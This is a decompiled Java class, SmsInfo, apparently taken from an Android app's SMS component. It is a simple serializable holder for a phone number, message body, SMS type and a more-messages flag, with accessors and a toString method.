package com.vvt.sms;

import java.io.Serializable;

public class SmsInfo
  implements Serializable
{
  private static final long serialVersionUID = 338246502375273690L;
  private String messageBody = "";
  private boolean moreMsgToSend;
  private String phoneNumber = "";
  private SmsInfo.SmsType type;
  
  public String getMessageBody()
  {
    return this.messageBody;
  }
  
  public String getPhoneNumber()
  {
    return this.phoneNumber;
  }
  
  public SmsInfo.SmsType getType()
  {
    return this.type;
  }
  
  public boolean hasMoreMsgToSend()
  {
    return this.moreMsgToSend;
  }
  
  public void setMessageBody(String paramString)
  {
    if (paramString != null)
    {
      String str = paramString.trim();
      int i = str.length();
      if (i != 0) {}
    }
    else
    {
      paramString = "";
    }
    this.messageBody = paramString;
  }
  
  public void setMoreMsgToSend(boolean paramBoolean)
  {
    this.moreMsgToSend = paramBoolean;
  }
  
  public void setPhoneNumber(String paramString)
  {
    if (paramString != null)
    {
      String str = paramString.trim();
      int i = str.length();
      if (i != 0) {}
    }
    else
    {
      paramString = "";
    }
    this.phoneNumber = paramString;
  }
  
  public void setType(SmsInfo.SmsType paramSmsType)
  {
    this.type = paramSmsType;
  }
  
  public String toString()
  {
    Object[] arrayOfObject = new Object[2];
    String str = this.phoneNumber;
    arrayOfObject[0] = str;
    str = this.messageBody;
    arrayOfObject[1] = str;
    return String.format("number: %s, body: %s", arrayOfObject);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/sms/SmsInfo.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */